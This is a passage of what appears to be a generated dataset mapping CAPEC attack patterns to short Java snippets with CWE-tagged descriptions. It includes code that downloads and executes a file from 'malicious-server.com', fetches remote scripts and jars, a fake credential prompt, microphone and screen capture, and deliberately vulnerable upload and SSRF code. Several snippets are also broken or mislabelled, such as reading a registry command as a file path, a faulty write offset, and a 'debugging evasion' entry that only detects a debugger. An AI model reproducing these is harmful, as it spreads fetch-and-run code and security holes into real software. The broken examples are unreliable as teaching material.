        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class SharedDirectoryScanner {\n    public static void main(String[] args) {\n        String sharedDirPath = \"\\\\UNC\\share\\name\\\";\n        File sharedDir = new File(sharedDirPath);\n\n        if (sharedDir.exists() && sharedDir.isDirectory()) {\n            File[] files = sharedDir.listFiles();\n            if (files != null) {\n                for (File file : files) {\n                    try {\n                        String content = new String(Files.readAllBytes(Paths.get(file.getPath())));\n                        System.out.println(\"File: \" + file.getName() + \"\\nContent: \" + content);\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                    }\n                }\n            }\n        } else {\n            System.out.println(\"Shared directory does not exist or is not a directory.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates how an adversary might identify and access shared files or directories on a system, which aligns with the CAPEC description. The code attempts to access a shared directory specified by a UNC path (CWE-40) and lists all files within it. For each file, it reads and prints the content, potentially exposing sensitive information (CWE-200, CWE-552). The code does not perform any privilege checks, which could allow unauthorized access to sensitive files (CWE-267). Additionally, the use of a fixed path for the shared directory can be exploited if the path is controlled by unintended actors (CWE-427)."
    },
    {
        "capec_id": "644",
        "capec_name": "Use of Captured Hashes (Pass The Hash)",
        "code_snippet": "import java.security.MessageDigest;\nimport java.security.NoSuchAlgorithmException;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class PassTheHashExample {\n    private static Map<String, String> userDatabase = new HashMap<>();\n\n    public static void main(String[] args) throws NoSuchAlgorithmException {\n        // Storing password hashes in the database\n        userDatabase.put(\"user1\", hashPassword(\"password123\"));\n\n        // Simulating an attacker capturing the hash\n        String capturedHash = userDatabase.get(\"user1\");\n\n        // Using the captured hash to authenticate\n        if (authenticateWithHash(\"user1\", capturedHash)) {\n            System.out.println(\"Authentication successful using captured hash!\");\n        } else {\n            System.out.println(\"Authentication failed.\");\n        }\n    }\n\n    private static String hashPassword(String password) throws NoSuchAlgorithmException {\n        MessageDigest md = MessageDigest.getInstance(\"SHA-256\");\n        byte[] hash = md.digest(password.getBytes());\n        StringBuilder hexString = new StringBuilder();\n        for (byte b : hash) {\n            hexString.append(String.format(\"%02x\", b));\n        }\n        return hexString.toString();\n    }\n\n    private static boolean authenticateWithHash(String username, String hash) {\n        return userDatabase.containsKey(username) && userDatabase.get(username).equals(hash);\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of the 'Pass The Hash' attack. It stores password hashes in a database and simulates an attacker capturing a hash and using it to authenticate. The `hashPassword` method hashes a password using SHA-256, and the `authenticateWithHash` method checks if the provided hash matches the stored hash for a given user. This example embodies CWE-522 (Insufficiently Protected Credentials) by storing hashes insecurely, CWE-836 (Use of Password Hash Instead of Password for Authentication) by comparing hashes directly, and CWE-294 (Authentication Bypass by Capture-replay) by allowing authentication using a captured hash. The code highlights the risks of using single-factor authentication and the potential for replay attacks."
    },
    {
        "capec_id": "645",
        "capec_name": "Use of Captured Tickets (Pass The Ticket)",
        "code_snippet": "import java.io.*;\nimport java.net.*;\nimport javax.crypto.*;\nimport javax.crypto.spec.SecretKeySpec;\n\npublic class KerberosTicketReplay {\n    private static final String SECRET_KEY = \"1234567890123456\"; // Insecure key storage (CWE-522)\n\n    public static void main(String[] args) throws Exception {\n        // Simulate capturing a Kerberos ticket\n        byte[] capturedTicket = captureTicket();\n\n        // Replay the captured ticket to authenticate\n        if (authenticateWithTicket(capturedTicket)) {\n            System.out.println(\"Authentication successful using captured ticket.\");\n        } else {\n            System.out.println(\"Authentication failed.\");\n        }\n    }\n\n    private static byte[] captureTicket() throws Exception {\n        // Simulate capturing a ticket from network traffic (CWE-294)\n        String ticket = \"fakeKerberosTicket\";\n        return encrypt(ticket.getBytes(), SECRET_KEY);\n    }\n\n    private static boolean authenticateWithTicket(byte[] ticket) throws Exception {\n        // Simulate authentication using the captured ticket\n        byte[] decryptedTicket = decrypt(ticket, SECRET_KEY);\n        String ticketStr = new String(decryptedTicket);\n        return \"fakeKerberosTicket\".equals(ticketStr); // Bypass authentication (CWE-294)\n    }\n\n    private static byte[] encrypt(byte[] data, String key) throws Exception {\n        SecretKeySpec secretKey = new SecretKeySpec(key.getBytes(), \"AES\");\n        Cipher cipher = Cipher.getInstance(\"AES\");\n        cipher.init(Cipher.ENCRYPT_MODE, secretKey);\n        return cipher.doFinal(data);\n    }\n\n    private static byte[] decrypt(byte[] data, String key) throws Exception {\n        SecretKeySpec secretKey = new SecretKeySpec(key.getBytes(), \"AES\");\n        Cipher cipher = Cipher.getInstance(\"AES\");\n        cipher.init(Cipher.DECRYPT_MODE, secretKey);\n        return cipher.doFinal(data);\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of the 'Use of Captured Tickets (Pass The Ticket)' attack. The code simulates capturing a Kerberos ticket from network traffic and then replays it to authenticate to a system. The captured ticket is encrypted and decrypted using a hardcoded secret key, which is an example of insufficiently protected credentials (CWE-522). The authentication process bypasses proper verification by directly comparing the decrypted ticket with a known value, illustrating an authentication bypass by capture-replay (CWE-294). This code highlights the vulnerabilities associated with insecure handling of authentication tickets and the risks of single-factor authentication."
    },
    {
        "capec_id": "646",
        "capec_name": "Peripheral Footprinting",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.util.List;\n\npublic class PeripheralFootprinting {\n    public static void main(String[] args) {\n        try {\n            // Example of searching for iOS backups\n            File backupDir = new File(System.getProperty(\"user.home\") + \"/AppData/Roaming/Apple Computer/MobileSync/Backup\");\n            if (backupDir.exists() && backupDir.isDirectory()) {\n                File[] backups = backupDir.listFiles();\n                if (backups != null) {\n                    for (File backup : backups) {\n                        System.out.println(\"Found iOS backup: \" + backup.getName());\n                    }\n                }\n            }\n\n            // Example of analyzing Windows registry for USB devices\n            List<String> registryOutput = Files.readAllLines(Paths.get(\"C:\\\\Windows\\\\System32\\\\reg.exe QUERY HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Enum\\\\USBSTOR\"));\n            for (String line : registryOutput) {\n                if (line.contains(\"USB\")) {\n                    System.out.println(\"Found USB device entry: \" + line);\n                }\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'Peripheral Footprinting' by attempting to gather information about attached peripheral devices and components connected to a computer system. The code includes two main parts: searching for iOS backups and analyzing the Windows registry for USB devices. The first part checks a common directory for iOS backups and lists any found backups. The second part reads the Windows registry to find entries related to USB storage devices. This information could be useful for an adversary to gain additional insight about the system or network environment, which aligns with the CAPEC description. The code also touches on related CWEs by potentially exposing sensitive information (CWE-200, CWE-497) and handling system-level information improperly (CWE-67)."
    },
    {
        "capec_id": "647",
        "capec_name": "Collect Data from Registries",
        "code_snippet": "import java.util.prefs.Preferences;\n\npublic class RegistryDataCollector {\n    public static void main(String[] args) {\n        // Accessing Windows Registry using Java Preferences API\n        Preferences systemRoot = Preferences.systemRoot();\n        Preferences userRoot = Preferences.userRoot();\n\n        // Improper Authorization: No checks for user permissions\n        String sensitiveData = systemRoot.get(\"SensitiveKey\", \"default\");\n        System.out.println(\"Sensitive Data: \" + sensitiveData);\n\n        // Cleartext Storage in the Registry: Storing sensitive data in cleartext\n        userRoot.put(\"SensitiveKey\", \"SensitiveValue\");\n        System.out.println(\"Sensitive data stored in registry.\");\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an adversary can exploit weaknesses in authorization to gather and store sensitive information in the Windows Registry. The code uses the Java Preferences API to access and manipulate registry data. It highlights two main vulnerabilities: \n1. Improper Authorization (CWE-285): The code does not perform any authorization checks before accessing sensitive data from the system registry.\n2. Cleartext Storage in the Registry (CWE-314): The code stores sensitive information in cleartext within the user registry.\n\nThe main idea of the CAPEC is represented by showing how an adversary can exploit these weaknesses to gather system-specific data and sensitive information from the registry, which can then be used for further attacks."
    },
    {
        "capec_id": "648",
        "capec_name": "Collect Data from Screen Capture",
        "code_snippet": "import java.awt.AWTException;\nimport java.awt.Rectangle;\nimport java.awt.Robot;\nimport java.awt.Toolkit;\nimport java.awt.image.BufferedImage;\nimport java.io.File;\nimport java.io.IOException;\nimport javax.imageio.ImageIO;\n\npublic class ScreenCapture {\n    public static void main(String[] args) {\n        try {\n            // Capture the screen\n            Robot robot = new Robot();\n            Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());\n            BufferedImage screenFullImage = robot.createScreenCapture(screenRect);\n            \n            // Save the captured image to a file\n            File file = new File(\"screenshot.png\");\n            ImageIO.write(screenFullImage, \"png\", file);\n            System.out.println(\"A screenshot has been taken and saved as screenshot.png\");\n        } catch (AWTException | IOException ex) {\n            System.err.println(ex);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates how an adversary could exploit the system's screen capture functionality to gather sensitive information. The code uses the `Robot` class to capture the entire screen and save it as a PNG file. This action can be leveraged by an attacker to monitor and record sensitive information displayed on the screen, such as passwords, personal data, or confidential documents. The code embodies the main idea of CAPEC-Collect Data from Screen Capture and highlights related weaknesses such as CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) by not restricting access to the screen capture functionality, and CWE-267 (Privilege Defined With Unsafe Actions) by allowing the screen capture to be performed without proper privilege checks."
    },
    {
        "capec_id": "649",
        "capec_name": "Adding a Space to a File Extension",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\n\npublic class FileUpload {\n    public static void main(String[] args) {\n        String fileName = \"example.txt \"; // Trailing space added\n        try {\n            File file = new File(\"uploads/\" + fileName);\n            if (file.exists()) {\n                System.out.println(\"File already exists: \" + file.getName());\n            } else {\n                if (file.createNewFile()) {\n                    System.out.println(\"File created: \" + file.getName());\n                } else {\n                    System.out.println(\"Failed to create file.\");\n                }\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability where a file is created with a trailing space in its name. The main idea is to show how an adversary can exploit the trailing space to manipulate file handling. The code attempts to create a file named 'example.txt ' (with a trailing space) in the 'uploads' directory. If the file already exists, it prints a message; otherwise, it creates the file. This vulnerability can lead to ambiguous path resolution and potential security risks, as the application does not properly neutralize trailing special elements in file names. This example embodies the CAPEC concept and related CWEs by showing how improper handling of file names can be exploited."
    },
    {
        "capec_id": "650",
        "capec_name": "Upload a Web Shell to a Web Server",
        "code_snippet": "import java.io.*;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport javax.servlet.http.Part;\n\n@WebServlet(\"/upload\")\npublic class FileUploadServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        Part filePart = request.getPart(\"file\");\n        String fileName = getFileName(filePart);\n        File uploads = new File(\"/var/www/uploads\");\n        File file = new File(uploads, fileName);\n        try (InputStream input = filePart.getInputStream()) {\n            Files.copy(input, file.toPath());\n        }\n        response.getWriter().println(\"File uploaded successfully!\");\n    }\n\n    private String getFileName(Part part) {\n        for (String content : part.getHeader(\"content-disposition\").split(\";\")) {\n            if (content.trim().startsWith(\"filename\")) {\n                return content.substring(content.indexOf('=') + 1).trim().replace(\"\\\"\", \"\");\n            }\n        }\n        return null;\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerable file upload functionality. The servlet allows users to upload files to the server without proper validation or authentication, embodying the CAPEC 'Upload a Web Shell to a Web Server'. The code does not check the file type (CWE-434), does not authenticate the user (CWE-287), and stores the uploaded file in a web-accessible directory (/var/www/uploads), which could allow an attacker to upload a malicious web shell. This web shell could then be executed remotely, potentially with elevated permissions, leading to severe security risks."
    },
    {
        "capec_id": "651",
        "capec_name": "Eavesdropping",
        "code_snippet": "import javax.sound.sampled.*;\nimport java.io.*;\n\npublic class EavesdroppingExample {\n    public static void main(String[] args) {\n        try {\n            // Obtain and open the microphone line\n            AudioFormat format = new AudioFormat(16000, 8, 2, true, true);\n            DataLine.Info info = new DataLine.Info(TargetDataLine.class, format);\n            TargetDataLine microphone = (TargetDataLine) AudioSystem.getLine(info);\n            microphone.open(format);\n            microphone.start();\n\n            // Create a buffer to read the microphone data\n            byte[] buffer = new byte[1024];\n            ByteArrayOutputStream out = new ByteArrayOutputStream();\n\n            // Read data from the microphone and write to the output stream\n            while (true) {\n                int bytesRead = microphone.read(buffer, 0, buffer.length);\n                out.write(buffer, 0, bytesRead);\n\n                // Simulate sending the data over a cleartext channel\n                sendOverCleartextChannel(out.toByteArray());\n                out.reset();\n            }\n        } catch (LineUnavailableException | IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void sendOverCleartextChannel(byte[] data) {\n        // Simulate sending data over a cleartext channel\n        System.out.println(\"Sending data: \" + new String(data));\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of eavesdropping by capturing audio data from a microphone and transmitting it over a cleartext channel. The code opens a microphone line, reads audio data into a buffer, and then simulates sending this data over an unencrypted channel. This embodies the CAPEC concept of eavesdropping by intercepting raw audio communication and relates to CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) and CWE-319 (Cleartext Transmission of Sensitive Information). The code also indirectly touches on CWE-514 (Covert Channel) by using the microphone data in a way not intended by the system's designers."
    },
    {
        "capec_id": "652",
        "capec_name": "Use of Known Kerberos Credentials",
        "code_snippet": "import java.io.*;\nimport java.net.*;\nimport java.util.Base64;\n\npublic class KerberosAuth {\n    private static final String KERBEROS_TICKET = \"base64EncodedTicket\";\n    private static final String SERVER_ADDRESS = \"http://example.com/authenticate\";\n\n    public static void main(String[] args) {\n        try {\n            URL url = new URL(SERVER_ADDRESS);\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"POST\");\n            conn.setRequestProperty(\"Authorization\", \"Kerberos \" + KERBEROS_TICKET);\n            conn.setDoOutput(true);\n\n            int responseCode = conn.getResponseCode();\n            if (responseCode == 200) {\n                System.out.println(\"Authenticated successfully.\");\n            } else {\n                System.out.println(\"Authentication failed.\");\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified Kerberos authentication process where a base64 encoded Kerberos ticket is used to authenticate against a server. The code sets up an HTTP connection to a server and includes the Kerberos ticket in the Authorization header. This example embodies the CAPEC 'Use of Known Kerberos Credentials' by showing how an adversary could use a stolen or purchased Kerberos ticket to gain authenticated access to a system. The code also highlights several related CWEs: CWE-522 (Insufficiently Protected Credentials) as the ticket is hardcoded and not securely managed, CWE-308 (Use of Single-factor Authentication) as it relies solely on the Kerberos ticket, and CWE-294 (Authentication Bypass by Capture-replay) as the ticket could potentially be captured and replayed by an attacker."
    },
    {
        "capec_id": "653",
        "capec_name": "Use of Known Operating System Credentials",
        "code_snippet": "import java.util.Scanner;\n\npublic class VulnerableLogin {\n    private static final String USERNAME = \"admin\";\n    private static final String PASSWORD = \"password123\";\n\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter username: \");\n        String inputUsername = scanner.nextLine();\n        System.out.print(\"Enter password: \");\n        String inputPassword = scanner.nextLine();\n\n        if (authenticate(inputUsername, inputPassword)) {\n            System.out.println(\"Access granted.\");\n        } else {\n            System.out.println(\"Access denied.\");\n        }\n    }\n\n    private static boolean authenticate(String username, String password) {\n        return USERNAME.equals(username) && PASSWORD.equals(password);\n    }\n}",
        "description": "This Java code snippet represents a simple and vulnerable login system. It embodies the main idea of CAPEC-Use of Known Operating System Credentials by using hardcoded credentials (USERNAME and PASSWORD) for authentication. The code is vulnerable to several CWE weaknesses:\n\n1. CWE-522: Insufficiently Protected Credentials - The credentials are hardcoded and not protected, making them susceptible to unauthorized retrieval.\n2. CWE-307: Improper Restriction of Excessive Authentication Attempts - The code does not implement any measures to prevent multiple failed authentication attempts, making it vulnerable to brute force attacks.\n3. CWE-308: Use of Single-factor Authentication - The code uses only a username and password for authentication, which is a single-factor authentication method.\n4. CWE-309: Use of Password System for Primary Authentication - The primary means of authentication is a password system, which has several inherent flaws.\n5. CWE-262: Not Using Password Aging - There is no mechanism for managing password aging.\n6. CWE-263: Password Aging with Long Expiration - Although not directly shown, the hardcoded password implies no expiration mechanism.\n7. CWE-654: Reliance on a Single Factor in a Security Decision - The authentication decision relies solely on the username and password, a single factor.\n\nThis code demonstrates how an adversary could exploit these weaknesses to gain unauthorized access to the system."
    },
    {
        "capec_id": "654",
        "capec_name": "Credential Prompt Impersonation",
        "code_snippet": "import javax.swing.*;\nimport java.awt.*;\nimport java.awt.event.ActionEvent;\nimport java.awt.event.ActionListener;\n\npublic class CredentialPromptImpersonation extends JFrame {\n    public CredentialPromptImpersonation() {\n        setTitle(\"Login\");\n        setSize(300, 150);\n        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\n        setLocationRelativeTo(null);\n\n        JPanel panel = new JPanel();\n        panel.setLayout(new GridLayout(3, 2));\n\n        JLabel userLabel = new JLabel(\"Username:\");\n        JTextField userText = new JTextField();\n        JLabel passwordLabel = new JLabel(\"Password:\");\n        JPasswordField passwordText = new JPasswordField();\n        JButton loginButton = new JButton(\"Login\");\n\n        panel.add(userLabel);\n        panel.add(userText);\n        panel.add(passwordLabel);\n        panel.add(passwordText);\n        panel.add(new JLabel());\n        panel.add(loginButton);\n\n        add(panel);\n\n        loginButton.addActionListener(new ActionListener() {\n            @Override\n            public void actionPerformed(ActionEvent e) {\n                String username = userText.getText();\n                String password = new String(passwordText.getPassword());\n                // Simulate storing credentials insecurely\n                System.out.println(\"Username: \" + username);\n                System.out.println(\"Password: \" + password);\n            }\n        });\n    }\n\n    public static void main(String[] args) {\n        SwingUtilities.invokeLater(new Runnable() {\n            @Override\n            public void run() {\n                new CredentialPromptImpersonation().setVisible(true);\n            }\n        });\n    }\n}",
        "description": "This Java code snippet creates a simple GUI application that impersonates a login prompt using Swing. The application captures the username and password entered by the user and prints them to the console, simulating insecure storage of credentials. This example embodies the CAPEC 'Credential Prompt Impersonation' by demonstrating how an adversary could create a fake login prompt to steal user credentials. The code also touches on related CWEs: it does not properly restrict UI layers (CWE-1021), it stores credentials insecurely (CWE-522), and it could potentially use hard-coded or weak credentials (CWE-798, CWE-1391)."
    },
    {
        "capec_id": "655",
        "capec_name": "Avoid Security Tool Identification by Adding Data",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class VulnerableFileHandler {\n    public static void main(String[] args) {\n        String filePath = \"sensitive_data.txt\";\n        String tempFilePath = \"temp_data.txt\";\n        String sensitiveData = \"username=admin;password=secret\";\n\n        try {\n            // CWE-541: Inclusion of Sensitive Information in an Include File\n            FileWriter writer = new FileWriter(filePath);\n            writer.write(sensitiveData);\n            writer.close();\n\n            // CWE-532: Insertion of Sensitive Information into Log File\n            logSensitiveData(sensitiveData);\n\n            // CWE-377: Insecure Temporary File\n            File tempFile = new File(tempFilePath);\n            tempFile.createNewFile();\n            Files.write(Paths.get(tempFilePath), sensitiveData.getBytes());\n\n            // CAPEC: Avoid Security Tool Identification by Adding Data\n            addPaddingToFile(tempFilePath, 1024 * 1024 * 10); // Add 10MB padding\n\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void logSensitiveData(String data) throws IOException {\n        FileWriter logWriter = new FileWriter(\"log.txt\", true);\n        logWriter.write(data + \"\\n\");\n        logWriter.close();\n    }\n\n    private static void addPaddingToFile(String filePath, int paddingSize) throws IOException {\n        FileWriter writer = new FileWriter(filePath, true);\n        for (int i = 0; i < paddingSize; i++) {\n            writer.write(\"0\");\n        }\n        writer.close();\n    }\n}",
        "description": "This Java code snippet demonstrates several security weaknesses and the main idea of the CAPEC. The code writes sensitive information to a file (CWE-541), logs sensitive data (CWE-532), and creates an insecure temporary file (CWE-377). Additionally, it adds padding to the temporary file to increase its size, which can help avoid detection by security tools that may not handle large files effectively. This padding also changes the file's hash, making it harder for security tools to identify the file based on known hashes."
    },
    {
        "capec_id": "656",
        "capec_name": "Voice Phishing",
        "code_snippet": "import java.util.Scanner;\n\npublic class VoicePhishingExample {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Welcome to XYZ Bank. Please enter your account number:\");\n        String accountNumber = scanner.nextLine();\n        System.out.println(\"Please enter your password:\");\n        String password = scanner.nextLine();\n        \n        // Simulate a voice phishing attack\n        if (isPhishingCall()) {\n            System.out.println(\"Thank you for providing your details. Your account will be updated shortly.\");\n            // CWE-522: Insufficiently Protected Credentials\n            storeCredentials(accountNumber, password);\n        } else {\n            System.out.println(\"Authentication failed. Please try again.\");\n        }\n    }\n\n    private static boolean isPhishingCall() {\n        // CWE-940: Improper Verification of Source of a Communication Channel\n        // Simulate improper verification of the caller\n        return true; // Always returns true for demonstration purposes\n    }\n\n    private static void storeCredentials(String accountNumber, String password) {\n        // CWE-522: Insufficiently Protected Credentials\n        // Storing credentials in an insecure manner\n        System.out.println(\"Storing credentials: \" + accountNumber + \", \" + password);\n    }\n}",
        "description": "This Java code snippet simulates a voice phishing attack scenario. The user is prompted to enter their account number and password, which are then stored insecurely. The function `isPhishingCall` always returns true, representing improper verification of the communication channel's source (CWE-940). The credentials are stored insecurely, demonstrating insufficient protection (CWE-522). This code embodies the main idea of the CAPEC by showing how an adversary can solicit sensitive information via a voice call and highlights related weaknesses that can be exploited."
    },
    {
        "capec_id": "657",
        "capec_name": "Malicious Automated Software Update via Spoofing",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class MaliciousUpdate {\n    public static void main(String[] args) {\n        try {\n            // URL of the supposed update server (spoofed)\n            URL url = new URL(\"http://malicious-server.com/update\");\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"GET\");\n\n            // Check if the response code is 200 (OK)\n            if (conn.getResponseCode() == 200) {\n                InputStream in = conn.getInputStream();\n                FileOutputStream out = new FileOutputStream(\"update.exe\");\n\n                byte[] buffer = new byte[1024];\n                int bytesRead;\n                while ((bytesRead = in.read(buffer)) != -1) {\n                    out.write(buffer, bytesRead, bytesRead);\n                }\n\n                in.close();\n                out.close();\n\n                // Execute the downloaded file without integrity check\n                Runtime.getRuntime().exec(\"update.exe\");\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable software update mechanism that embodies the main idea of the CAPEC 'Malicious Automated Software Update via Spoofing'. The code attempts to download an update from a URL (which could be spoofed by an attacker) and executes it without verifying the origin or integrity of the downloaded file. This represents CWE-494 'Download of Code Without Integrity Check'. The downloaded file could contain malicious code (CWE-506 'Embedded Malicious Code') that could replicate itself (CWE-509 'Replicating Malicious Code'). The code also relies on the client to enforce security, which is a weak practice (CWE-602 'Client-Side Enforcement of Server-Side Security')."
    },
    {
        "capec_id": "660",
        "capec_name": "Root/Jailbreak Detection Evasion via Hooking",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.URL;\nimport java.net.URLConnection;\n\npublic class JailbreakDetectionEvasion {\n    public static void main(String[] args) {\n        try {\n            // CWE-494: Download of Code Without Integrity Check\n            URL url = new URL(\"http://example.com/malicious_code.jar\");\n            URLConnection connection = url.openConnection();\n            BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n            String inputLine;\n            StringBuilder code = new StringBuilder();\n            while ((inputLine = in.readLine()) != null) {\n                code.append(inputLine);\n            }\n            in.close();\n\n            // Simulate loading the downloaded code (CWE-829)\n            // This is a placeholder for actual code loading logic\n            System.out.println(\"Loaded code: \" + code.toString());\n\n            // CWE-78: OS Command Injection\n            String command = \"ls\"; // This could be any command\n            Process process = Runtime.getRuntime().exec(command);\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an adversary could evade Root/Jailbreak detection by downloading and executing arbitrary code. The code downloads a JAR file from a remote URL without performing any integrity checks (CWE-494). It then simulates loading this code, representing the inclusion of functionality from an untrusted control sphere (CWE-829). Additionally, the code executes an OS command without proper neutralization of special elements, which could lead to OS command injection (CWE-78). This snippet embodies the main idea of CAPEC-Root/Jailbreak Detection Evasion via Hooking by showing how an adversary might inject and execute arbitrary code to bypass security checks."
    },
    {
        "capec_id": "661",
        "capec_name": "Root/Jailbreak Detection Evasion via Debugging",
        "code_snippet": "import android.os.Debug;\nimport android.util.Log;\n\npublic class RootDetection {\n    public static void main(String[] args) {\n        if (isDebuggerAttached()) {\n            Log.e(\"RootDetection\", \"Debugger detected! Exiting application.\");\n            System.exit(1);\n        }\n        // Application logic here\n    }\n\n    private static boolean isDebuggerAttached() {\n        return Debug.isDebuggerConnected();\n    }\n}",
        "description": "This Java code snippet represents a basic implementation of root/jailbreak detection evasion via debugging in an Android application. The `isDebuggerAttached` method checks if a debugger is connected to the application using `Debug.isDebuggerConnected()`. If a debugger is detected, the application logs an error message and exits. This is a simplistic approach to demonstrate the concept of detecting and responding to debugging attempts, which is a common method used by adversaries to bypass root/jailbreak detection mechanisms. The code also highlights CWE-489 (Active Debug Code) by showing how debugging can be detected and potentially exploited if not properly managed."
    },
    {
        "capec_id": "662",
        "capec_name": "Adversary in the Browser (AiTB)",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableBrowser {\n    public static void main(String[] args) {\n        try {\n            URL url = new URL(\"http://example.com/malicious-script.js\");\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"GET\");\n            InputStream in = conn.getInputStream();\n            BufferedReader reader = new BufferedReader(new InputStreamReader(in));\n            StringBuilder script = new StringBuilder();\n            String line;\n            while ((line = reader.readLine()) != null) {\n                script.append(line);\n            }\n            reader.close();\n            // Execute the downloaded script without integrity check\n            executeScript(script.toString());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void executeScript(String script) {\n        // Simulate script execution\n        System.out.println(\"Executing script: \" + script);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable browser scenario where a script is downloaded and executed without verifying its integrity. The code fetches a script from a remote URL and executes it directly. This embodies the 'Adversary in the Browser (AiTB)' concept by showing how an attacker can exploit the lack of integrity checks (CWE-494) to manipulate traffic and execute malicious code. The code also implicitly highlights the risk of 'Channel Accessible by Non-Endpoint' (CWE-300) as the communication channel is not secured, allowing potential interception or manipulation by an adversary."
    },
    {
        "capec_id": "663",
        "capec_name": "Exploitation of Transient Instruction Execution",
        "code_snippet": "public class TransientExecutionExample {\n    private static final int SECRET = 0x12345678; // Sensitive data\n    private static final int ARRAY_SIZE = 256;\n    private static final int[] cache = new int[ARRAY_SIZE];\n\n    public static void main(String[] args) {\n        int index = getUserInput(); // Simulate user-controlled input\n        transientExecution(index);\n    }\n\n    private static int getUserInput() {\n        // Simulate user input that could be manipulated by an attacker\n        return 0; // Simplified for this example\n    }\n\n    private static void transientExecution(int index) {\n        // Simulate speculative execution\n        if (index < ARRAY_SIZE) {\n            // Access array based on user input\n            int value = cache[index];\n            // Use the value to access sensitive data\n            int secretValue = SECRET + value;\n            // Perform some operation with the secret value\n            System.out.println(\"Secret value: \" + secretValue);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified example of transient instruction execution, where speculative execution can lead to the exposure of sensitive data. The `transientExecution` method simulates speculative execution by accessing an array based on user input. If the index is within bounds, it retrieves a value from the cache and uses it to compute a secret value. This represents the concept of exploiting transient execution to access and manipulate sensitive data, as described in the CAPEC. The code also touches on related CWEs, such as non-transparent sharing of microarchitectural resources and exposure of sensitive information during transient execution."
    },
    {
        "capec_id": "664",
        "capec_name": "Server Side Request Forgery",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class SSRFExample {\n    public static void main(String[] args) {\n        try {\n            String userInput = args[0]; // Assume this input is coming from an untrusted source\n            URL url = new URL(userInput);\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"GET\");\n\n            BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n            String inputLine;\n            StringBuilder content = new StringBuilder();\n            while ((inputLine = in.readLine()) != null) {\n                content.append(inputLine);\n            }\n            in.close();\n            connection.disconnect();\n\n            System.out.println(content.toString());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a Server-Side Request Forgery (SSRF) vulnerability. The code takes a URL from user input (which is assumed to be untrusted) and makes an HTTP GET request to that URL. The response is then read and printed to the console. This code is vulnerable because it does not validate the user input, allowing an attacker to craft a malicious URL that could force the server to make requests to internal services or external third parties. This can lead to unauthorized access to sensitive data or other malicious actions. The code embodies CWE-918 (SSRF) and CWE-20 (Improper Input Validation) by not ensuring the request is sent to an expected destination and not validating the input properly."
    },
    {
        "capec_id": "665",
        "capec_name": "Exploitation of Thunderbolt Protection Flaws",
